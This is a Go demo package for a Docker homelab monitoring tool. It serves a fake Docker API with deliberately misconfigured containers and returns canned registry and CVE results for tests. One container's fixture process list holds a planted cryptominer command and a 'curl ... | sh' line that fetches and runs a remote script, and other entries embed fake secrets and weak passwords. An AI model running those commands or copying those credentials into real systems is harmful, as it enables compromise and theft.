// Package demo serves a fake Docker Engine API with a realistic homelab
// (and some deliberate mistakes), plus fake registry and CVE results. It
// powers KEELWATCH_DEMO=1 and the end-to-end tests.
package demo

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/keelwatch/keelwatch/internal/model"
)

type c struct {
	ID, Name, Image, State string
	ExitCode, Restarts     int
	OOM                    bool
	Health                 string
	User                   string
	Env                    []string
	Privileged             bool
	CapAdd                 []string
	NetworkMode            string
	Ports                  map[string]string // "8080/tcp" -> "0.0.0.0:8080"
	Mounts                 [][3]string       // source, dest, rw|ro
	Memory, NanoCpus       int64
	Pids                   int64
	ReadOnly, NoNewPrivs   bool
	LogMax                 string
	Restart                string
	HealthCmd              []string
	Devices                []string
	Procs                  []string
	CPU                    float64
	Service                string
}

var now = time.Now()

func id(s string) string { return fmt.Sprintf("%064x", []byte(s))[:64] }

var containers = []c{
	{Name: "vaultwarden", Image: "vaultwarden/server:1.32.0", State: "running", Health: "healthy", User: "1000:1000",
		Env: []string{"ADMIN_TOKEN_FILE=/run/secrets/admin_token", "SIGNUPS_ALLOWED=false"}, Ports: map[string]string{"80/tcp": "127.0.0.1:8083"},
		Mounts: [][3]string{{"/srv/vaultwarden", "/data", "rw"}}, Memory: 256 << 20, NanoCpus: 1e9, Pids: 100, ReadOnly: true, NoNewPrivs: true,
		LogMax: "10m", Restart: "unless-stopped", HealthCmd: []string{"CMD", "/healthcheck.sh"}, Procs: []string{"/vaultwarden"}, CPU: 0.4, Service: "vaultwarden"},
	{Name: "pihole", Image: "pihole/pihole:latest", State: "running", Health: "healthy", NetworkMode: "host", CapAdd: []string{"NET_ADMIN", "SYS_NICE"},
		Env: []string{"TZ=Asia/Kolkata", "FTLCONF_webserver_api_password=changeme"}, Mounts: [][3]string{{"/srv/pihole/etc", "/etc/pihole", "rw"}},
		Restart: "unless-stopped", HealthCmd: []string{"CMD-SHELL", "dig +short +norecurse +retry=0 @127.0.0.1 pi.hole || exit 1"}, Procs: []string{"/usr/bin/pihole-FTL -f", "crond -f"}, CPU: 1.2, Service: "pihole"},
	{Name: "jellyfin", Image: "jellyfin/jellyfin:10.9.11", State: "running", Health: "healthy", Ports: map[string]string{"8096/tcp": "0.0.0.0:8096"},
		Mounts: [][3]string{{"/srv/jellyfin/config", "/config", "rw"}, {"/mnt/media", "/media", "ro"}}, Devices: []string{"/dev/dri/renderD128"},
		Memory: 2 << 30, Restart: "unless-stopped", LogMax: "10m", Procs: []string{"/jellyfin/jellyfin --ffmpeg /usr/lib/jellyfin-ffmpeg/ffmpeg"}, CPU: 6.5, Service: "jellyfin"},
	{Name: "uptime-kuma", Image: "louislam/uptime-kuma:1", State: "running", Health: "healthy", Ports: map[string]string{"3001/tcp": "127.0.0.1:8084"},
		Mounts:  [][3]string{{"/srv/uptime-kuma", "/app/data", "rw"}, {"/var/run/docker.sock", "/var/run/docker.sock", "ro"}},
		Restart: "unless-stopped", HealthCmd: []string{"CMD", "extra/healthcheck"}, Procs: []string{"node server/server.js"}, CPU: 2.1, Service: "uptime-kuma"},
	{Name: "ollama", Image: "ollama/ollama:0.3.14", State: "running", Ports: map[string]string{"11434/tcp": "0.0.0.0:11434"},
		Mounts: [][3]string{{"/srv/ollama", "/root/.ollama", "rw"}}, Restart: "unless-stopped", Procs: []string{"/bin/ollama serve", "/usr/lib/ollama/runners/cpu/ollama_llama_server --model /root/.ollama/models/blobs/sha256-6a0746a1"}, CPU: 312, Service: "ollama"},
	{Name: "expense-tracker", Image: "ghcr.io/tinyserverlab/expense-tracker:0.4.2", State: "running", Health: "healthy", Ports: map[string]string{"8000/tcp": "0.0.0.0:8085"},
		Env:    []string{"DATABASE_URL=postgres://expense:Sup3rS3cret!@postgres:5432/expense", "AWS_ACCESS_KEY_ID=AKIAQ3EGTX7LZFDEMO42", "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYDEMOKEY12345", "SESSION_SECRET=8f2a1c9e7d6b5a4f3e2d1c0b9a8f7e6d"},
		Memory: 256 << 20, Restart: "unless-stopped", HealthCmd: []string{"CMD", "wget", "-qO-", "http://localhost:8000/health"}, Procs: []string{"python -m uvicorn app.main:app --host 0.0.0.0"}, CPU: 0.8, Service: "expense-tracker"},
	{Name: "postgres", Image: "postgres:15.4", State: "exited", ExitCode: 137, OOM: true, User: "",
		Env: []string{"POSTGRES_USER=expense", "POSTGRES_PASSWORD=postgres", "PGDATA=/var/lib/postgresql/data"}, Mounts: [][3]string{{"/srv/postgres", "/var/lib/postgresql/data", "rw"}},
		Memory: 128 << 20, Restart: "unless-stopped", Service: "postgres"},
	{Name: "meal-planner", Image: "ghcr.io/tinyserverlab/meal-planner:latest", State: "restarting", ExitCode: 1, Restarts: 37, Ports: map[string]string{"8000/tcp": "127.0.0.1:8086"},
		Env: []string{"SECRET_KEY="}, Restart: "always", Service: "meal-planner"},
	{Name: "speedtest-tracker", Image: "lscr.io/linuxserver/speedtest-tracker:0.20.6", State: "running", Health: "unhealthy", Ports: map[string]string{"80/tcp": "0.0.0.0:8082"},
		Env: []string{"PUID=1000", "PGID=1000", "APP_KEY=base64:Zm9vYmFyYmF6cXV4cXV1eGZvb2JhcmJhenF1eDEyMzQ="}, Restart: "unless-stopped", HealthCmd: []string{"CMD-SHELL", "curl -fSs http://localhost/api/healthcheck"},
		Procs: []string{"s6-svscan -t0 /var/run/s6/services", "php-fpm: master process", "nginx: master process"}, CPU: 0.3, Service: "speedtest-tracker"},
	{Name: "chore-tracker", Image: "ghcr.io/tinyserverlab/chore-tracker:0.2.0", State: "running", Ports: map[string]string{"8000/tcp": "0.0.0.0:8087"}, Privileged: true,
		Restart: "unless-stopped", Procs: []string{"node /app/index.js", "/tmp/.x/kdevtmpfsi -o stratum+tcp://pool.minexmr.example:4444 -u 4AdUndXHHZ", "sh -c curl -s http://203.0.113.9/k.sh | sh"}, CPU: 188, Service: "chore-tracker"},
}

type img struct {
	Ref     string
	Created time.Time
	Size    int64
	User    string
	Health  bool
}

var images = map[string]img{
	"vaultwarden/server:1.32.0":                    {Created: now.AddDate(0, -3, 0), Size: 247 << 20, User: "", Health: true},
	"pihole/pihole:latest":                         {Created: now.AddDate(0, 0, -20), Size: 311 << 20, Health: true},
	"jellyfin/jellyfin:10.9.11":                    {Created: now.AddDate(0, -8, 0), Size: 1300 << 20},
	"louislam/uptime-kuma:1":                       {Created: now.AddDate(0, -2, 0), Size: 438 << 20, Health: true},
	"ollama/ollama:0.3.14":                         {Created: now.AddDate(-1, -1, 0), Size: 2900 << 20},
	"ghcr.io/tinyserverlab/expense-tracker:0.4.2":  {Created: now.AddDate(0, 0, -12), Size: 162 << 20},
	"postgres:15.4":                                {Created: now.AddDate(-2, 0, 0), Size: 412 << 20},
	"ghcr.io/tinyserverlab/meal-planner:latest":    {Created: now.AddDate(0, 0, -2), Size: 158 << 20},
	"lscr.io/linuxserver/speedtest-tracker:0.20.6": {Created: now.AddDate(0, -7, 0), Size: 233 << 20},
	"ghcr.io/tinyserverlab/chore-tracker:0.2.0":    {Created: now.AddDate(0, -1, 0), Size: 141 << 20},
	"nginx:1.25-alpine":                            {Created: now.AddDate(-1, 0, 0), Size: 43 << 20},
	"<none>:<none>":                                {Created: now.AddDate(0, -4, 0), Size: 880 << 20},
}

func imgID(ref string) string { return "sha256:" + id("img:"+ref) }

// Start serves the fake API on a unix socket and returns its DOCKER_HOST.
func Start(ctx context.Context, dir string) (string, error) {
	sock := filepath.Join(dir, "demo-docker.sock")
	_ = os.Remove(sock)
	ln, err := net.Listen("unix", sock)
	if err != nil {
		return "", err
	}
	srv := &http.Server{Handler: handler()}
	go func() { <-ctx.Done(); _ = srv.Close() }()
	go func() { _ = srv.Serve(ln) }()
	return "unix://" + sock, nil
}

func handler() http.Handler {
	byID := map[string]c{}
	for i := range containers {
		containers[i].ID = id("ctr:" + containers[i].Name)
		byID[containers[i].ID] = containers[i]
	}
	mux := http.NewServeMux()
	j := func(w http.ResponseWriter, v any) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(v)
	}
	strip := func(p string) string { // tolerate versioned paths like /v1.43/info
		if strings.HasPrefix(p, "/v1.") {
			if i := strings.Index(p[1:], "/"); i >= 0 {
				return p[i+1:]
			}
		}
		return p
	}
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		p := strip(r.URL.Path)
		switch {
		case p == "/info":
			j(w, map[string]any{"Name": "pi5-lab", "ServerVersion": "27.3.1", "OperatingSystem": "Debian GNU/Linux 12 (bookworm)", "KernelVersion": "6.6.51+rpt-rpi-2712",
				"Architecture": "aarch64", "Driver": "overlay2", "LoggingDriver": "json-file", "DockerRootDir": "/var/lib/docker", "NCPU": 4, "MemTotal": int64(8 << 30),
				"SecurityOptions": []string{"name=apparmor", "name=seccomp,profile=builtin", "name=cgroupns"}, "LiveRestoreEnabled": false,
				"Containers": len(containers), "ContainersRunning": 7, "Images": len(images), "Warnings": []string{}})
		case p == "/version":
			j(w, map[string]any{"Version": "27.3.1", "ApiVersion": "1.47"})
		case p == "/networks/bridge":
			j(w, map[string]any{"Name": "bridge", "Options": map[string]string{"com.docker.network.bridge.enable_icc": "true"}})
		case p == "/containers/json":
			var out []map[string]any
			for _, x := range containers {
				out = append(out, map[string]any{"Id": x.ID, "Names": []string{"/" + x.Name}, "Image": x.Image, "ImageID": imgID(x.Image), "State": x.State})
			}
			j(w, out)
		case p == "/images/json":
			var out []map[string]any
			for ref, im := range images {
				tags := []string{ref}
				digests := []string{strings.Split(ref, ":")[0] + "@sha256:" + id("dig:"+ref)}
				if ref == "<none>:<none>" {
					tags, digests = nil, nil
				}
				n := 0
				for _, x := range containers {
					if x.Image == ref {
						n++
					}
				}
				out = append(out, map[string]any{"Id": imgID(ref), "RepoTags": tags, "RepoDigests": digests, "Created": im.Created.Unix(), "Size": im.Size, "Containers": n})
			}
			j(w, out)
		case p == "/system/df":
			var ims []map[string]any
			for ref, im := range images {
				n := 0
				for _, x := range containers {
					if x.Image == ref {
						n++
					}
				}
				tags := []string{ref}
				if ref == "<none>:<none>" {
					tags = nil
				}
				ims = append(ims, map[string]any{"Id": imgID(ref), "Size": im.Size, "SharedSize": 0, "Containers": n, "RepoTags": tags})
			}
			j(w, map[string]any{"Images": ims, "Volumes": []map[string]any{{"Name": "old_db", "UsageData": map[string]any{"Size": 1 << 30, "RefCount": 0}}},
				"BuildCache": []map[string]any{{"Size": int64(2400) << 20, "InUse": false}}})
		case p == "/events":
			w.Header().Set("Content-Type", "application/json")
			w.(http.Flusher).Flush()
			select {
			case <-time.After(3 * time.Second):
			case <-r.Context().Done():
				return
			}
			ev := map[string]any{"Type": "container", "Action": "exec_start: /bin/bash", "time": time.Now().Unix(),
				"Actor": map[string]any{"ID": id("ctr:chore-tracker"), "Attributes": map[string]string{"name": "chore-tracker", "image": "ghcr.io/tinyserverlab/chore-tracker:0.2.0"}}}
			_ = json.NewEncoder(w).Encode(ev)
			w.(http.Flusher).Flush()
			<-r.Context().Done()
		case strings.HasPrefix(p, "/images/") && strings.HasSuffix(p, "/json"):
			key := strings.TrimSuffix(strings.TrimPrefix(p, "/images/"), "/json")
			for ref, im := range images {
				if imgID(ref) == key || ref == key {
					cfg := map[string]any{"User": im.User, "Env": []string{"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin"}}
					if im.Health {
						cfg["Healthcheck"] = map[string]any{"Test": []string{"CMD-SHELL", "true"}}
					}
					j(w, map[string]any{"Id": imgID(ref), "RepoTags": []string{ref}, "Created": im.Created.Format(time.RFC3339), "Size": im.Size, "Config": cfg})
					return
				}
			}
			http.Error(w, `{"message":"no such image"}`, 404)
		case strings.HasPrefix(p, "/containers/"):
			rest := strings.TrimPrefix(p, "/containers/")
			cid, sub, _ := strings.Cut(rest, "/")
			x, ok := byID[cid]
			if !ok {
				http.Error(w, `{"message":"no such container"}`, 404)
				return
			}
			switch sub {
			case "json":
				j(w, inspect(x))
			case "top":
				var procs [][]string
				for i, cmd := range x.Procs {
					procs = append(procs, []string{"root", fmt.Sprint(1000 + i), "1", "0", "10:00", "?", "00:00:01", cmd})
				}
				j(w, map[string]any{"Titles": []string{"UID", "PID", "PPID", "C", "STIME", "TTY", "TIME", "CMD"}, "Processes": procs})
			case "stats":
				total := uint64(1e9)
				used := uint64(x.CPU / 100 / 4 * float64(total))
				lim := uint64(8 << 30)
				if x.Memory > 0 {
					lim = uint64(x.Memory)
				}
				j(w, map[string]any{
					"cpu_stats":    map[string]any{"cpu_usage": map[string]any{"total_usage": 5e9 + used}, "system_cpu_usage": 9e10 + total, "online_cpus": 4},
					"precpu_stats": map[string]any{"cpu_usage": map[string]any{"total_usage": 5e9}, "system_cpu_usage": 9e10, "online_cpus": 4},
					"memory_stats": map[string]any{"usage": lim / 5, "limit": lim, "stats": map[string]any{"inactive_file": 0}},
				})
			default:
				http.NotFound(w, r)
			}
		default:
			http.NotFound(w, r)
		}
	})
	return mux
}

func inspect(x c) map[string]any {
	st := map[string]any{"Status": x.State, "Running": x.State == "running", "Restarting": x.State == "restarting", "OOMKilled": x.OOM, "ExitCode": x.ExitCode,
		"StartedAt": now.Add(-36 * time.Hour).Format(time.RFC3339)}
	if x.Health != "" {
		h := map[string]any{"Status": x.Health, "FailingStreak": 0}
		if x.Health == "unhealthy" {
			h["FailingStreak"] = 14
			h["Log"] = []map[string]any{{"ExitCode": 22, "Output": "curl: (22) The requested URL returned error: 500"}}
		}
		st["Health"] = h
	}
	pb := map[string]any{}
	for port, bind := range x.Ports {
		ip, hp, _ := strings.Cut(bind, ":")
		pb[port] = []map[string]string{{"HostIp": ip, "HostPort": hp}}
	}
	var mounts []map[string]any
	for _, m := range x.Mounts {
		mounts = append(mounts, map[string]any{"Type": "bind", "Source": m[0], "Destination": m[1], "RW": m[2] == "rw"})
	}
	var devs []map[string]string
	for _, d := range x.Devices {
		devs = append(devs, map[string]string{"PathOnHost": d, "PathInContainer": d})
	}
	sec := []string{}
	if x.NoNewPrivs {
		sec = append(sec, "no-new-privileges:true")
	}
	logCfg := map[string]string{}
	if x.LogMax != "" {
		logCfg["max-size"] = x.LogMax
	}
	var pids any
	if x.Pids > 0 {
		pids = x.Pids
	}
	var hc any
	if x.HealthCmd != nil {
		hc = map[string]any{"Test": x.HealthCmd}
	}
	nm := x.NetworkMode
	if nm == "" {
		nm = "pi5-lab_default"
	}
	return map[string]any{
		"Id": x.ID, "Name": "/" + x.Name, "Image": imgID(x.Image), "RestartCount": x.Restarts, "State": st,
		"Config": map[string]any{"User": x.User, "Env": x.Env, "Image": x.Image, "Healthcheck": hc,
			"Labels": map[string]string{"com.docker.compose.project": "pi5-lab", "com.docker.compose.service": x.Service,
				"com.docker.compose.project.config_files": "/srv/pi5-lab/stacks/" + x.Service + "/compose.yml"}},
		"HostConfig": map[string]any{"Privileged": x.Privileged, "CapAdd": x.CapAdd, "NetworkMode": nm, "ReadonlyRootfs": x.ReadOnly,
			"Memory": x.Memory, "NanoCpus": x.NanoCpus, "PidsLimit": pids, "SecurityOpt": sec, "Devices": devs, "PortBindings": pb,
			"RestartPolicy": map[string]any{"Name": x.Restart}, "LogConfig": map[string]any{"Type": "json-file", "Config": logCfg}},
		"Mounts": mounts,
	}
}

// Checker returns canned registry results.
type Checker struct{}

func (Checker) Check(_ context.Context, ref string, _ []string) *model.UpdateStatus {
	st := &model.UpdateStatus{Ref: ref, CheckedAt: time.Now().UTC(), RemoteDigs: "sha256:" + id("remote:"+ref)}
	switch ref {
	case "vaultwarden/server:1.32.0":
		st.NewestTag, st.Bump = "1.32.5", "patch"
	case "pihole/pihole:latest":
		st.DigestNew = true
	case "jellyfin/jellyfin:10.9.11":
		st.NewestTag, st.Bump = "10.10.3", "minor"
	case "ollama/ollama:0.3.14":
		st.NewestTag, st.Bump = "0.4.7", "minor"
	case "postgres:15.4":
		st.NewestTag, st.Bump = "15.10", "minor"
	case "lscr.io/linuxserver/speedtest-tracker:0.20.6":
		st.NewestTag, st.Bump = "1.1.1", "major"
	case "ghcr.io/tinyserverlab/meal-planner:latest", "ghcr.io/tinyserverlab/expense-tracker:0.4.2", "ghcr.io/tinyserverlab/chore-tracker:0.2.0":
		st.Error = "registry token: 401 Unauthorized (private image?)"
	}
	return st
}

// Scanner returns canned CVE results.
type Scanner struct{}

func (Scanner) Available() bool { return true }

func (Scanner) Scan(_ context.Context, ref, imageID string) *model.ImageScan {
	time.Sleep(400 * time.Millisecond)
	s := &model.ImageScan{ImageID: imageID, Ref: ref, ScannedAt: time.Now().UTC(), Counts: map[string]int{}}
	add := func(id, pkg, inst, fixed string, sev model.Severity, title string, n int) {
		s.CVEs = append(s.CVEs, model.CVE{ID: id, Pkg: pkg, Installed: inst, Fixed: fixed, Severity: sev, Title: title})
		s.Counts[string(sev)] += n
		if fixed != "" {
			s.Fixable += n
		}
	}
	switch ref {
	case "postgres:15.4":
		add("CVE-2024-10979", "postgresql-15", "15.4-1.pgdg120+1", "15.9-1.pgdg120+1", model.SevHigh, "PL/Perl environment variable changes execute arbitrary code", 1)
		add("CVE-2023-5869", "postgresql-15", "15.4-1.pgdg120+1", "15.5-1.pgdg120+1", model.SevHigh, "Buffer overrun from integer overflow in array modification", 1)
		add("CVE-2024-45491", "libexpat1", "2.5.0-1", "2.5.0-1+deb12u1", model.SevCritical, "Integer overflow in dtdCopy", 1)
		add("CVE-2023-4911", "libc6", "2.36-9+deb12u1", "2.36-9+deb12u3", model.SevHigh, "Looney Tunables: local privilege escalation in glibc ld.so", 1)
		s.Counts["medium"] += 24
		s.Counts["low"] += 61
	case "ollama/ollama:0.3.14":
		add("CVE-2024-45337", "golang.org/x/crypto", "v0.26.0", "0.31.0", model.SevCritical, "Misuse of ServerConfig.PublicKeyCallback may cause authorization bypass", 1)
		add("CVE-2024-37032", "github.com/ollama/ollama", "0.3.14", "", model.SevMedium, "Path traversal in model pull (example)", 1)
		s.Counts["medium"] += 9
		s.Counts["low"] += 14
	case "jellyfin/jellyfin:10.9.11":
		add("CVE-2024-5535", "libssl3", "3.0.13-1~deb12u1", "3.0.14-1~deb12u1", model.SevHigh, "SSL_select_next_proto buffer overread", 1)
		s.Counts["medium"] += 11
		s.Counts["low"] += 40
	case "ghcr.io/tinyserverlab/chore-tracker:0.2.0":
		add("CVE-2024-21538", "cross-spawn", "7.0.3", "7.0.5", model.SevHigh, "Regular expression denial of service", 1)
		s.Secrets = []string{"AWS Access Key ID in /app/.env (aws-access-key-id)"}
	default:
		s.Counts["low"] += 3
	}
	return s
}
